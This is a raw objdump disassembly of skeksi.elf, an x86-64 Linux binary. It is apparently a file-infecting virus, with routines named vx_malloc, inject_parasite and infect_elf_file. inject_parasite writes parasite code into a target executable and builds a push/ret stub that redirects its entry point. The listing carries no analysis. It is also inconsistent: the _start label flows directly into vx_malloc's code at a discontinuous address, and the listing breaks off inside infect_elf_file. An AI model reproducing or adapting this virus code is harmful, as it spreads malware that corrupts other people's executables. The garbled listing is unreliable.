
skeksi.elf:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  4003a1:	be 00 00 20 00       	mov    esi,0x200000
  4003a6:	bf 00 00 00 00       	mov    edi,0x0
  4003ab:	e8 c0 1d 00 00       	call   402170 <_mmap>
  4003b0:	48 8b 55 f0          	mov    rdx,QWORD PTR [rbp-0x10]
  4003b4:	48 89 02             	mov    QWORD PTR [rdx],rax
  4003b7:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003bb:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003be:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  4003c2:	75 0c                	jne    4003d0 <vx_malloc+0x66>
  4003c4:	48 c7 c7 ff ff ff ff 	mov    rdi,0xffffffffffffffff
  4003cb:	e8 e5 1b 00 00       	call   401fb5 <Exit>
  4003d0:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003d4:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003d7:	48 8d 90 00 01 00 00 	lea    rdx,[rax+0x100]
  4003de:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003e2:	48 89 10             	mov    QWORD PTR [rax],rdx
  4003e5:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003e9:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003ec:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  4003f0:	48 f7 da             	neg    rdx
  4003f3:	48 01 d0             	add    rax,rdx
  4003f6:	c9                   	leave  
  4003f7:	c3                   	ret    

00000000004003f8 <_rand>:
  4003f8:	55                   	push   rbp
  4003f9:	48 89 e5             	mov    rbp,rsp
  4003fc:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  400400:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400404:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400407:	48 69 c0 6d 4e c6 41 	imul   rax,rax,0x41c64e6d
  40040e:	48 8d 90 39 30 00 00 	lea    rdx,[rax+0x3039]
  400415:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400419:	48 89 10             	mov    QWORD PTR [rax],rdx
  40041c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400420:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400423:	48 8d 90 ff ff 00 00 	lea    rdx,[rax+0xffff]
  40042a:	48 85 c0             	test   rax,rax
  40042d:	48 0f 48 c2          	cmovs  rax,rdx
  400431:	48 c1 f8 10          	sar    rax,0x10
  400435:	25 ff 7f 00 00       	and    eax,0x7fff
  40043a:	5d                   	pop    rbp
  40043b:	c3                   	ret    

000000000040043c <full_path>:
  40043c:	f3 0f 1e fa          	endbr64 
  400440:	55                   	push   rbp
  400441:	48 89 e5             	mov    rbp,rsp
  400444:	53                   	push   rbx
  400445:	48 83 ec 38          	sub    rsp,0x38
  400449:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  40044d:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  400451:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  400455:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400459:	48 89 c7             	mov    rdi,rax
  40045c:	e8 62 26 00 00       	call   402ac3 <_strlen>
  400461:	48 89 c3             	mov    rbx,rax
  400464:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400468:	48 89 c7             	mov    rdi,rax
  40046b:	e8 53 26 00 00       	call   402ac3 <_strlen>
  400470:	48 01 d8             	add    rax,rbx
  400473:	48 8d 50 02          	lea    rdx,[rax+0x2]
  400477:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  40047b:	48 89 c6             	mov    rsi,rax
  40047e:	48 89 d7             	mov    rdi,rdx
  400481:	e8 e4 fe ff ff       	call   40036a <vx_malloc>
  400486:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40048a:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  40048e:	48 89 c7             	mov    rdi,rax
  400491:	e8 2d 26 00 00       	call   402ac3 <_strlen>
  400496:	89 c3                	mov    ebx,eax
  400498:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40049c:	48 89 c7             	mov    rdi,rax
  40049f:	e8 1f 26 00 00       	call   402ac3 <_strlen>
  4004a4:	8d 14 03             	lea    edx,[rbx+rax*1]
  4004a7:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4004ab:	be 00 00 00 00       	mov    esi,0x0
  4004b0:	48 89 c7             	mov    rdi,rax
  4004b3:	e8 b6 1e 00 00       	call   40236e <Memset>
  4004b8:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4004bc:	48 89 c7             	mov    rdi,rax
  4004bf:	e8 ff 25 00 00       	call   402ac3 <_strlen>
  4004c4:	89 c2                	mov    edx,eax
  4004c6:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  4004ca:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4004ce:	48 89 ce             	mov    rsi,rcx
  4004d1:	48 89 c7             	mov    rdi,rax
  4004d4:	e8 42 1e 00 00       	call   40231b <_memcpy>
  4004d9:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4004dd:	48 89 c7             	mov    rdi,rax
  4004e0:	e8 de 25 00 00       	call   402ac3 <_strlen>
  4004e5:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  4004e9:	48 01 d0             	add    rax,rdx
  4004ec:	c6 00 2f             	mov    BYTE PTR [rax],0x2f
  4004ef:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004f3:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4004f6:	3c 2e                	cmp    al,0x2e
  4004f8:	75 14                	jne    40050e <full_path+0xd2>
  4004fa:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004fe:	48 83 c0 01          	add    rax,0x1
  400502:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400505:	3c 2f                	cmp    al,0x2f
  400507:	75 05                	jne    40050e <full_path+0xd2>
  400509:	48 83 45 d8 02       	add    QWORD PTR [rbp-0x28],0x2
  40050e:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400512:	48 89 c7             	mov    rdi,rax
  400515:	e8 a9 25 00 00       	call   402ac3 <_strlen>
  40051a:	89 c3                	mov    ebx,eax
  40051c:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400520:	48 89 c7             	mov    rdi,rax
  400523:	e8 9b 25 00 00       	call   402ac3 <_strlen>
  400528:	48 8d 50 01          	lea    rdx,[rax+0x1]
  40052c:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400530:	48 8d 0c 02          	lea    rcx,[rdx+rax*1]
  400534:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400538:	89 da                	mov    edx,ebx
  40053a:	48 89 c6             	mov    rsi,rax
  40053d:	48 89 cf             	mov    rdi,rcx
  400540:	e8 d6 1d 00 00       	call   40231b <_memcpy>
  400545:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400549:	48 83 c4 38          	add    rsp,0x38
  40054d:	5b                   	pop    rbx
  40054e:	5d                   	pop    rbp
  40054f:	c3                   	ret    

0000000000400550 <inject_parasite>:
  400550:	f3 0f 1e fa          	endbr64 
  400554:	55                   	push   rbp
  400555:	48 89 e5             	mov    rbp,rsp
  400558:	48 81 ec 30 01 00 00 	sub    rsp,0x130
  40055f:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  400566:	48 89 b5 f0 fe ff ff 	mov    QWORD PTR [rbp-0x110],rsi
  40056d:	48 89 95 e8 fe ff ff 	mov    QWORD PTR [rbp-0x118],rdx
  400574:	48 89 8d e0 fe ff ff 	mov    QWORD PTR [rbp-0x120],rcx
  40057b:	4c 89 85 d8 fe ff ff 	mov    QWORD PTR [rbp-0x128],r8
  400582:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  400589:	c7 45 f8 40 00 00 00 	mov    DWORD PTR [rbp-0x8],0x40
  400590:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400597:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40059b:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40059f:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  4005a6:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  4005aa:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4005ae:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  4005b5:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  4005b9:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  4005bd:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  4005c4:	48 8d 48 68          	lea    rcx,[rax+0x68]
  4005c8:	48 8d 85 10 ff ff ff 	lea    rax,[rbp-0xf0]
  4005cf:	ba 90 00 00 00       	mov    edx,0x90
  4005d4:	48 89 ce             	mov    rsi,rcx
  4005d7:	48 89 c7             	mov    rdi,rax
  4005da:	e8 3c 1d 00 00       	call   40231b <_memcpy>
  4005df:	8b 85 28 ff ff ff    	mov    eax,DWORD PTR [rbp-0xd8]
  4005e5:	89 c0                	mov    eax,eax
  4005e7:	48 89 c2             	mov    rdx,rax
  4005ea:	be 41 02 00 00       	mov    esi,0x241
  4005ef:	48 8d 3d 1a 27 00 00 	lea    rdi,[rip+0x271a]        # 402d10 <display_skeksi+0x7f>
  4005f6:	e8 d9 19 00 00       	call   401fd4 <_open>
  4005fb:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  4005fe:	83 7d dc ff          	cmp    DWORD PTR [rbp-0x24],0xffffffff
  400602:	75 0a                	jne    40060e <inject_parasite+0xbe>
  400604:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400609:	e9 de 01 00 00       	jmp    4007ec <inject_parasite+0x29c>
  40060e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400611:	48 63 d0             	movsxd rdx,eax
  400614:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400617:	48 98                	cdqe   
  400619:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  40061d:	48 89 ce             	mov    rsi,rcx
  400620:	48 89 c7             	mov    rdi,rax
  400623:	e8 36 1a 00 00       	call   40205e <_write>
  400628:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  40062b:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40062e:	39 45 d8             	cmp    DWORD PTR [rbp-0x28],eax
  400631:	74 0a                	je     40063d <inject_parasite+0xed>
  400633:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400638:	e9 af 01 00 00       	jmp    4007ec <inject_parasite+0x29c>
  40063d:	e8 13 26 00 00       	call   402c55 <get_rip>
  400642:	48 c7 c2 62 2c 40 00 	mov    rdx,0x402c62
  400649:	48 89 d1             	mov    rcx,rdx
  40064c:	48 c7 c2 70 2c 40 00 	mov    rdx,0x402c70
  400653:	48 29 d1             	sub    rcx,rdx
  400656:	48 89 ca             	mov    rdx,rcx
  400659:	48 29 d0             	sub    rax,rdx
  40065c:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  400660:	e8 f0 25 00 00       	call   402c55 <get_rip>
  400665:	48 c7 c2 62 2c 40 00 	mov    rdx,0x402c62
  40066c:	48 89 d1             	mov    rcx,rdx
  40066f:	48 c7 c2 85 2c 40 00 	mov    rdx,0x402c85
  400676:	48 29 d1             	sub    rcx,rdx
  400679:	48 89 ca             	mov    rdx,rcx
  40067c:	48 29 d0             	sub    rax,rdx
  40067f:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  400683:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400687:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  40068b:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  40068e:	e8 c2 25 00 00       	call   402c55 <get_rip>
  400693:	48 c7 c2 62 2c 40 00 	mov    rdx,0x402c62
  40069a:	48 89 d1             	mov    rcx,rdx
  40069d:	48 c7 c2 70 2c 40 00 	mov    rdx,0x402c70
  4006a4:	48 29 d1             	sub    rcx,rdx
  4006a7:	48 89 ca             	mov    rdx,rcx
  4006aa:	48 29 d0             	sub    rax,rdx
  4006ad:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  4006b1:	c7 85 0a ff ff ff 68 	mov    DWORD PTR [rbp-0xf6],0x68
  4006b8:	00 00 00 
  4006bb:	66 c7 85 0e ff ff ff 	mov    WORD PTR [rbp-0xf2],0xc300
  4006c2:	00 c3 
  4006c4:	48 8d 85 0a ff ff ff 	lea    rax,[rbp-0xf6]
  4006cb:	48 83 c0 01          	add    rax,0x1
  4006cf:	48 8b 95 d8 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x128]
  4006d6:	89 10                	mov    DWORD PTR [rax],edx
  4006d8:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  4006df:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  4006e3:	48 2d 50 46 00 00    	sub    rax,0x4650
  4006e9:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  4006ed:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  4006f0:	48 98                	cdqe   
  4006f2:	48 29 45 b0          	sub    QWORD PTR [rbp-0x50],rax
  4006f6:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4006f9:	48 98                	cdqe   
  4006fb:	48 8b 55 b0          	mov    rdx,QWORD PTR [rbp-0x50]
  4006ff:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  400703:	48 89 ce             	mov    rsi,rcx
  400706:	48 89 c7             	mov    rdi,rax
  400709:	e8 50 19 00 00       	call   40205e <_write>
  40070e:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400711:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400714:	48 39 45 b0          	cmp    QWORD PTR [rbp-0x50],rax
  400718:	74 0a                	je     400724 <inject_parasite+0x1d4>
  40071a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40071f:	e9 c8 00 00 00       	jmp    4007ec <inject_parasite+0x29c>
  400724:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400727:	48 98                	cdqe   
  400729:	48 8d 8d 0a ff ff ff 	lea    rcx,[rbp-0xf6]
  400730:	ba 06 00 00 00       	mov    edx,0x6
  400735:	48 89 ce             	mov    rsi,rcx
  400738:	48 89 c7             	mov    rdi,rax
  40073b:	e8 1e 19 00 00       	call   40205e <_write>
  400740:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  400743:	48 98                	cdqe   
  400745:	48 8d 90 4a 46 00 00 	lea    rdx,[rax+0x464a]
  40074c:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400750:	48 8d 48 06          	lea    rcx,[rax+0x6]
  400754:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400758:	48 01 c1             	add    rcx,rax
  40075b:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  40075e:	48 98                	cdqe   
  400760:	48 89 ce             	mov    rsi,rcx
  400763:	48 89 c7             	mov    rdi,rax
  400766:	e8 f3 18 00 00       	call   40205e <_write>
  40076b:	48 8b 85 f0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x110]
  400772:	83 c0 40             	add    eax,0x40
  400775:	89 45 ac             	mov    DWORD PTR [rbp-0x54],eax
  400778:	8b 4d ac             	mov    ecx,DWORD PTR [rbp-0x54]
  40077b:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  40077e:	48 98                	cdqe   
  400780:	ba 00 00 00 00       	mov    edx,0x0
  400785:	48 89 ce             	mov    rsi,rcx
  400788:	48 89 c7             	mov    rdi,rax
  40078b:	e8 86 19 00 00       	call   402116 <_lseek>
  400790:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400793:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400796:	3b 45 ac             	cmp    eax,DWORD PTR [rbp-0x54]
  400799:	74 07                	je     4007a2 <inject_parasite+0x252>
  40079b:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4007a0:	eb 4a                	jmp    4007ec <inject_parasite+0x29c>
  4007a2:	48 83 45 f0 40       	add    QWORD PTR [rbp-0x10],0x40
  4007a7:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4007ae:	83 e8 40             	sub    eax,0x40
  4007b1:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
  4007b4:	8b 55 a8             	mov    edx,DWORD PTR [rbp-0x58]
  4007b7:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4007ba:	48 98                	cdqe   
  4007bc:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  4007c0:	48 89 ce             	mov    rsi,rcx
  4007c3:	48 89 c7             	mov    rdi,rax
  4007c6:	e8 93 18 00 00       	call   40205e <_write>
  4007cb:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  4007ce:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  4007d1:	3b 45 a8             	cmp    eax,DWORD PTR [rbp-0x58]
  4007d4:	74 07                	je     4007dd <inject_parasite+0x28d>
  4007d6:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4007db:	eb 0f                	jmp    4007ec <inject_parasite+0x29c>
  4007dd:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4007e0:	89 c7                	mov    edi,eax
  4007e2:	e8 23 18 00 00       	call   40200a <_close>
  4007e7:	b8 00 00 00 00       	mov    eax,0x0
  4007ec:	c9                   	leave  
  4007ed:	c3                   	ret    

00000000004007ee <infect_elf_file>:
  4007ee:	f3 0f 1e fa          	endbr64 
  4007f2:	55                   	push   rbp
  4007f3:	48 89 e5             	mov    rbp,rsp
  4007f6:	48 81 ec 00 01 00 00 	sub    rsp,0x100
  4007fd:	48 89 bd 08 ff ff ff 	mov    QWORD PTR [rbp-0xf8],rdi
